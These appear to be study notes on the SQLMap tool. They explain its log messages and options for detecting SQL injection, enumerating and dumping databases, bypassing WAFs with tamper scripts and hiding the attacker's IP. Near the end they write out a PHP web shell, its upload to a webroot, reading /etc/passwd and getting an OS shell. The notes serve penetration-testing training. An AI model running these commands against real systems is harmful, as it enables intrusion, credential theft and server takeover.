# **Log Messages Description**

### **URL content is stable**

<aside>
ðŸ’¡ `Log Message:`

- "target URL content is stable"

This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. While stability is important, SQLMap has advanced mechanisms to automatically remove the potential "noise" that could come from potentially unstable targets.

</aside>

### **Parameter appears to be dynamic**

<aside>
ðŸ’¡ `Log Message:`

- "GET parameter 'id' appears to be dynamic"

It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.

</aside>

### **Parameter might be injectable**

<aside>
ðŸ’¡ `Log Message:`

- "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g.Â `?id=1",)..).))'`), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.

</aside>

### **Parameter might be vulnerable to XSS attacks**

<aside>
ðŸ’¡ `Log Message:`

- "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.

</aside>

### **Back-end DBMS is '...'**

<aside>
ðŸ’¡ `Log Message:`

- "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"

In a normal run, SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.

</aside>

### **Level/risk values**

<aside>
ðŸ’¡ `Log Message:`

- "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"

If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.

</aside>

### **Reflective values found**

<aside>
ðŸ’¡ `Log Message:`

- "reflective value(s) found and filtering out"

Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

</aside>

### **Parameter appears to be injectable**

<aside>
ðŸ’¡ `Log Message:`

- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.

Additionally,Â `with --string="luther"`Â indicates that SQLMap recognized and used the appearance of constant string valueÂ `luther`Â in the response for distinguishingÂ `TRUE`Â fromÂ `FALSE`Â responses. This is an important finding because in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.

</aside>

### **Time-based comparison statistical model**

<aside>
ðŸ’¡ `Log Message:`

- "time-based comparison requires a larger statistical model, please wait........... (done)"

SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

</aside>

### **Extending UNION query injection technique tests**

<aside>
ðŸ’¡ `Log Message:`

- "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.

</aside>

### **Technique appears to be usable**

<aside>
ðŸ’¡ `Log Message:`

- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

As a heuristic check for the UNION-query SQLi type, before the actualÂ `UNION`Â payloads are sent, a technique known asÂ `ORDER BY`Â is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of requiredÂ `UNION`Â columns by conducting the binary-search approach.

Note that this depends on the affected table in the vulnerable query.

- ORDER BY technique
    
    ```sql
    ORDER BY 1 -- -
    ORDER BY 2 -- -
    ORDER BY 3 -- -
    ORDER BY 4 -- -
    ....
    ```
    
</aside>

### **Parameter is vulnerable**

<aside>
ðŸ’¡ `Log Message:`

- "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"

This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.

</aside>

### **Sqlmap identified injection points**

<aside>
ðŸ’¡ `Log Message:`

- "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).

</aside>

### **Data logged to text files**

<aside>
ðŸ’¡ `Log Message:`

- "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case,Â `www.example.com`. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.

</aside>

# copy as cURL

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizingÂ `Copy as cURL`
Â feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:

![Untitled](SQLmap%2057e4f4e0564c4a7885ad7978853ca86e/Untitled.png)

changing the original commandÂ `curl`Â toÂ `sqlmap`, we are able to use SQLMap with the identicalÂ `curl`command:

```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

---

# GET requests (`-u`)

In the most common scenario,Â `GET`Â parameters are provided with the usage of optionÂ `-u`/`--url`

```bash
sqlmap -u "http://www.site.com/vuln.php?id=1"
```

---

# POST data (`--data`)

- In such cases,Â `POST`Â parametersÂ `uid`Â andÂ `name`Â will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameterÂ `uid`Â is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter usingÂ `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special markerÂ `*`Â as follows:

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

```bash
sqlmap 'http://www.example.com/' --data $json_file
```

---

# Full HTTP request (`-r`)

request file contains the whole HTTP request inside a single textual file.

```bash
sqlmap -r $request_file
```

```bash
sqlmap -r $json_file
```

> Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk `(**)`, such as `'/?id=*'`.
> 

---

# **Custom SQLMap Requests**

If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.

For example, if there is a requirement to specify the (session) cookie value toÂ `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c`Â optionÂ `--cookie`Â would be used as follows:

## Custom Header (`-H/--header`)

```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of optionÂ `-H/--header`:

```bash
sqlmap ... -H 'Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

We can apply the same to options likeÂ `--host`,Â `--referer`, andÂ `-A/--user-agent`, which are used to specify the same HTTP headers' values.

## User-Agent (`--random-agent` `--mobile`)

Furthermore, there is a switchÂ `--random-agent`Â designed to randomly select aÂ `User-agent`Â header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value 
(e.g.Â `User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`). Alternatively, theÂ `--mobile`Â switch can be used to imitate the smartphone by using that same header value.

## Headers injection (`--header='name=value*'`)

While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g.Â `--cookie="id=1*"`). The same principle applies to any other part of the request. 

## Method (`--method`)

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

---

# **Attack Tuning**

<aside>
ðŸ’¡ In most cases, SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:

- vector (e.g.,Â `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
- boundaries (e.g.Â `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.
</aside>

## **Prefix/Suffix**

`--prefix`, `--suffix`

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

This will result in an enclosure of all vector values between the static prefixÂ `%'))`and the suffixÂ `-- -`.

## **Level/Risk**

By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

For such demands, the optionsÂ `--level`Â andÂ `--risk`Â should be used:

- The optionÂ `-level`Â (`1-5`, defaultÂ `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The optionÂ `-risk`Â (`1-3`, defaultÂ `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

The best way to check for differences between used boundaries and payloads for different values ofÂ `--level`Â andÂ `--risk`, is the usage ofÂ `-v`Â option to set the verbosity level. In verbosity 3 or higher (e.g.Â `-v 3`), messages containing the usedÂ `[PAYLOAD]`Â will be displayed.

As for the number of payloads, by default (i.e.Â `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.

As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage ofÂ `OR`Â payloads is a must (e.g., in case ofÂ `login`Â pages), we may have to raise the risk level ourselves.

This is becauseÂ `OR`Â payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g.Â `DELETE`Â orÂ `UPDATE`).

---

# **Advanced Tuning**

To further fine-tune the detection mechanism, there is a hefty set of switches and options. In regular cases, SQLMap will not require its usage. Still, we need to be familiar with them so that we could use them when needed.

## **Status Codes**

<aside>
ðŸ’¡ For example, when dealing with a huge target response with a lot of dynamic content, subtle differences betweenÂ `TRUE`Â andÂ `FALSE`Â responses could be used for detection purposes. If the difference betweenÂ `TRUE`Â andÂ `FALSE`Â responses can be seen in the HTTP codes (e.g.Â `200`Â forÂ `TRUE`Â andÂ `500`Â forÂ `FALSE`), the optionÂ `--code`Â could be used to fixate the detection ofÂ `TRUE`Â responses to a specific HTTP code (e.g.Â `--code=200`).

</aside>

## **Titles**

<aside>
ðŸ’¡ If the difference between responses can be seen by inspecting the HTTP page titles, the switchÂ `--titles`Â could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tagÂ `<title>`.

</aside>

## **Strings**

<aside>
ðŸ’¡ In case of a specific string value appearing inÂ `TRUE`Â responses (e.g.Â `success`), while absent inÂ `FALSE`Â responses, the optionÂ `--string`Â could be used to fixate the detection based only on the appearance of that single value (e.g.Â `--string=success`).

</aside>

## **Text-only**

<aside>
ðŸ’¡ When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g.Â `<script>`,Â `<style>`,Â `<meta>`, etc.), we can use theÂ `--text-only`Â switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

</aside>

## **Techniques**

<aside>
ðŸ’¡ In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the optionÂ `--technique`Â can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques withÂ `--technique=BEU`.

</aside>

## **UNION SQLi Tuning**

<aside>
ðŸ’¡ In some cases,Â `UNION`Â SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the optionÂ `--union-cols`Â (e.g.Â `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL`Â and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g.Â `--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of aÂ `UNION`Â query in the form of theÂ `FROM <table>`Â (e.g., in case of Oracle), we can set it with the optionÂ `--union-from`Â (e.g.Â `--union-from=users`).Failing to use the properÂ `FROM`Â appendix automatically could be due to the inability to detect the DBMS name before its usage.

</aside>

---

# DB Enumeration

SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.

- `--banner`                                     Database version (`VERSION()`)
- `--current-user`
- `--current-db`
- `--hostname`
- `--passwords`                             Enumerate DBMS users password hashes
- `--is-dba`                                     is Database Admin ?
- `-D`                                                    Database Name
- `--tables`                                     Enumerate Tables
- `--dump -T table_name`      dump table_name
- `--dump-format`                         Specify a dump format (HTML or SQLite)
- `-C Column1, Column2`         dump specific columns (`-C column_name`)
- `--start=4 --stop=10`         dump from the fourth row to the tenth
- `--where="name='admin'"` Conditional Enumeration
- `--dump-all`                                Dump all DBMS databases tables entries
- `--exclude-sysdbs`                Exclude DBMS system databases when enumerating tables
    - itâ€™s recommended to use `--exclude-sysdbs` with `--dump-all` to exclude system databases

<aside>
ðŸ’¡ **Important Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.**

</aside>

---

# Advanced DB Enumeration

- `--schema`          Enumerate DBMS schema
- `--search`           Search column(s), table(s) and/or database name(s)
    - `sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --search -T user` (searching tables LIKE 'user')
    - `sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --search -C pass` (searching columns LIKE â€˜passâ€™)

<aside>
ðŸ’¡ **Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.**

</aside>

# Bypass Web Application Protections

## **Anti-CSRF Token Bypass**

SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option isÂ `--csrf-token`. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.

Additionally, even in a case where the user does not explicitly specify the token's name viaÂ `--csrf-token`, if one of the provided parameters contains any of the common infixes (i.e.Â `csrf`,Â `xsrf`,Â `token`), the user will be prompted whether to update it in further requests:

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## **Unique Value Bypass**

In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the optionÂ `--randomize`Â should be used, pointing to the parameter name containing a value which should be randomized before being sent:

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

## **Calculated Parameter Bypass**

Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g.Â `h=MD5(id)`) of another one. To bypass this, the optionÂ `--eval`Â should be used, where a valid Python code is being evaluated just before the request is being sent to the target:

```bash
sqlmap -u "http://www.example.com/?id=1&**h**=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; **h**=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

## **IP Address Concealing**

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the optionÂ `--proxy`Â (e.g.Â `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.

In addition to that, if we have a list of proxies, we can provide them to SQLMap with the optionÂ `--proxy-file`. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be aÂ `SOCKS4`Â proxy service at the local port 9050 or 9150. By using switchÂ `--tor`, SQLMap will automatically try to find the local port and use it appropriately.

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switchÂ `--check-tor`. In such cases, SQLMap will connect to theÂ `https://check.torproject.org/`Â and check the response for the intended result (i.e.,Â `Congratulations`Â appears inside).

## **WAF Bypass**

Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g.Â `?pfov=...`) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be aÂ `406 - Not Acceptable`Â response after such a request.

In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party libraryÂ [identYwaf](https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switchÂ `--skip-waf`.

## **Tamper Scripts**

Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

For example, one of the most popular tamper scriptsÂ [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py)Â is replacing all occurrences of greater than operator (`>`) withÂ `NOT BETWEEN 0 AND #`, and the equals operator (`=`) withÂ `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.

Tamper scripts can be chained, one after another, within theÂ `--tamper`Â option (e.g.Â `--tamper=between,randomcase`), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g.Â [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). In contrast, some tamper scripts do not care about the inner content (e.g.Â [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).

Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:

| Tamper-Script | Description |
| --- | --- |
| 0eunion | Replaces instances ofÂ UNION withÂ e0UNION |
| base64encode | Base64-encodes all characters in a given payload |
| between | Replaces greater than operator (>) withÂ NOT BETWEEN 0 AND #Â and equals operator (=) withÂ BETWEEN # AND # |
| commalesslimit | Replaces (MySQL) instances likeÂ LIMIT M, NÂ withÂ LIMIT N OFFSET MÂ counterpart |
| equaltolike | Replaces all occurrences of operator equal (=) withÂ LIKEÂ counterpart |
| halfversionedmorekeywords | Adds (MySQL) versioned comment before each keyword |
| modsecurityversioned | Embraces complete query with (MySQL) versioned comment |
| modsecurityzeroversioned | Embraces complete query with (MySQL) zero-versioned comment |
| percentage | Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T) |
| plus2concat | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart |
| randomcase | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt) |
| space2comment | Replaces space character (Â ) with comments `/ |
| space2dash | Replaces space character (Â ) with a dash comment (--) followed by a random string and a new line (\n) |
| space2hash | Replaces (MySQL) instances of space character (Â ) with a pound character (#) followed by a random string and a new line (\n) |
| space2mssqlblank | Replaces (MsSQL) instances of space character (Â ) with a random blank character from a valid set of alternate characters |
| space2plus | Replaces space character (Â ) with plus (+) |
| space2randomblank | Replaces space character (Â ) with a random blank character from a valid set of alternate characters |
| symboliclogical | Replaces AND and OR logical operators with their symbolic counterparts (&&Â andÂ ||) |

To get a whole list of implemented tamper scripts, along with the description as above, switchÂ `--list-tampers`Â can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.

## **Miscellaneous Bypasses**

Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is theÂ `Chunked`Â transfer encoding, turned on using the switchÂ `--chunked`, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

The other bypass mechanisms is theÂ `HTTP parameter pollution`Â (`HPP`), where payloads are split in a similar way as in case ofÂ `--chunked`Â between different same parameter named values (e.g.Â `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), which are concatenated by the target platform if supporting it (e.g.Â `ASP`).

# **OS Exploitation**

SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.

- donâ€™t forget to use `--is-dba` to check if you are Database Admin

## **File Read**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

## **Writing Local Files**

When it comes it writing files to the hosting server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.

This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySql, theÂ `--secure-file-priv`Â configuration must be manually disabled to allow writing data into local files using theÂ `INTO OUTFILE`Â SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory we need.

Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use theÂ `--file-write`Â andÂ `--file-dest`Â options. First, let's prepare a basic PHP web shell and write it into aÂ `shell.php`Â file:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, let's attempt to write this file on the remote server, in theÂ `/var/www/html/`Â directory, the default server webroot for Apache. If we didn't know the server webroot, we will see how SQLMap can automatically find it.

```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

## **OS Command Execution**

Now that we confirmed that we could write a PHP shell to get command execution, we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, likeÂ `xp_cmdshell`Â in Microsoft SQL Server. To get an OS shell with SQLMap, we can use theÂ `--os-shell`Â option, as follows:

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

We see that SQLMap defaulted toÂ `UNION`Â technique to get an OS shell, but eventually failed to give us any outputÂ `No output`. So, as we already know we have multiple types of SQL injection vulnerabilities, let's try to specify another technique that has a better chance of giving us direct output, like theÂ `Error-based SQL Injection`, which we can specify withÂ `--technique=E`

---

# Handling Errors

## **Display Errors**

The first step is usually to switch theÂ `--parse-errors`, to parse the DBMS errors (if any) and displays them as part of the program run:

## Store Traffic

TheÂ `-t`Â option stores the whole traffic content to an output file:

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

## **Verbose Output**

Another useful flag is theÂ `-v`Â option, which raises the verbosity level of the console output:

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

`-v [0-6] (default 1)`

## **Using Proxy**

Finally, we can utilize theÂ `--proxy`Â option to redirect the whole traffic through a (MiTM) proxy (e.g.,Â `Burp`). This will route all SQLMap traffic throughÂ `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features ofÂ `Burp`Â with these requests:
